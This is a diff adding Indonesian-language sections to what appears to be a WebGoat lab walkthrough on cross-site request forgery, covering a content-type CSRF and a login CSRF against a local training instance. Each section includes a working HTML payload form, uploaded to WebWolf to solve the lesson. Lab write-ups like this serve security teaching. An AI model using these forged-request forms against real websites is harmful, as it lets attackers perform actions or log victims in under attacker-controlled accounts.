@@ -90,3 +90,85 @@ CSRF atau XSRF adalah jenis eksploitasi berbahaya pada situs web di mana perinta
 ![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/Cross-site%20request%20forgeries/csrf%2018.JPG)
 
 ![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/Cross-site%20request%20forgeries/csrf%2019.JPG)
+
+## CSRF and content-type
+- Sumber referensi: https://pentestmonkey.net/blog/csrf-xml-post-request
+- Disini kita akan membajak form di halaman http://127.0.0.1:9001/WebGoat/start.mvc#lesson/CSRF.lesson/6 sebagai berikut
+
+![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/Cross-site%20request%20forgeries/csrf%2020.JPG)
+
+- Form tersebut harus mengarah ke path URL **/csrf/feedback/message**
+
+![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/Cross-site%20request%20forgeries/csrf%2021.JPG)
+
+- Buat sebuah halaman dengan kode HTML sebagai berikut lalu simpan dengan nama **csrf3.html**
+```sh
+<form name="csrf-feedback" enctype="text/plain" action="http://127.0.0.1:9001/WebGoat/csrf/feedback/message" method="POST">
+	<input type="hidden" name='{"name":"Webgoat","email":"webgoat@webgoat.org","subject":"Suggestions","message":"Test Message' value='"}'>
+	<input type="submit">
+</form>
+```
+- Unggah file **csrf3.html** ke menu files di web wolf http://127.0.0.1:9090/files
+
+![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/Cross-site%20request%20forgeries/csrf%2022.JPG)
+
+- Jika sudah berhasil terunggah klik link
+
+![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/Cross-site%20request%20forgeries/csrf%2023.JPG)
+
+- Lalu tekan tombol **Submit Query**
+
+![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/Cross-site%20request%20forgeries/csrf%2024.JPG)
+
+- Copy nilai flag
+
+![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/Cross-site%20request%20forgeries/csrf%2025.JPG)
+
+- Paste ke field flag di halaman http://127.0.0.1:9001/WebGoat/start.mvc#lesson/CSRF.lesson/6
+
+![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/Cross-site%20request%20forgeries/csrf%2026.JPG)
+
+![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/Cross-site%20request%20forgeries/csrf%2027.JPG)
+
+## Login CSRF attack
+- Registerasi user baru di http://127.0.0.1:9001/WebGoat/registration. Jika nama user yang anda gunakan adalah `tom` maka harus mendaftarkan user baru dengan nama `csrf-tom`
+- Karena nama user yang saya gunakan adalah `testing` maka saya mendaftarkan user baru dengan nama `csrf-testing`
+
+![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/Cross-site%20request%20forgeries/csrf%2028.JPG)
+
+- Setelah registerasi berhasil, kita akan otomatis login sebagai user baru. Silahkan Log Out lalu login dengan akun user asli
+
+![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/Cross-site%20request%20forgeries/csrf%2029.JPG)
+
+![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/Cross-site%20request%20forgeries/csrf%2030.JPG)
+
+- Buat sebuah halaman dengan kode HTML sebagai berikut. Isi username dan password sesuai dengan akun yang anda daftarkan tadi, lalu simpan dengan nama **csrf4.html**
+```sh
+<form action="http://127.0.0.1:9001/WebGoat/login" method="POST">
+	<input type="hidden" name="username" value="csrf-testing">
+	<input type="hidden" name="password" value="testing">
+	<input type="submit">
+</form>
+<script>document.login.submit()</script>
+```
+- Unggah file **csrf3.html** ke menu files di web wolf http://127.0.0.1:9090/files
+
+![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/Cross-site%20request%20forgeries/csrf%2031.JPG)
+
+- Jika sudah berhasil terunggah klik link
+
+![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/Cross-site%20request%20forgeries/csrf%2032.JPG)
+
+- Lalu tekan tombol **Submit Query**
+
+![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/Cross-site%20request%20forgeries/csrf%2033.JPG)
+
+- Setelah berhasil login, pergi ke halaman http://127.0.0.1:9001/WebGoat/start.mvc#lesson/CSRF.lesson/7
+
+![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/Cross-site%20request%20forgeries/csrf%2034.JPG)
+
+- Kemudian tekan tombol **Solved!**
+
+![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/Cross-site%20request%20forgeries/csrf%2035.JPG)
+
+![alt text](https://github.com/rahardian-dwi-saputra/webgoat/blob/main/assets/Cross-site%20request%20forgeries/csrf%2036.JPG)
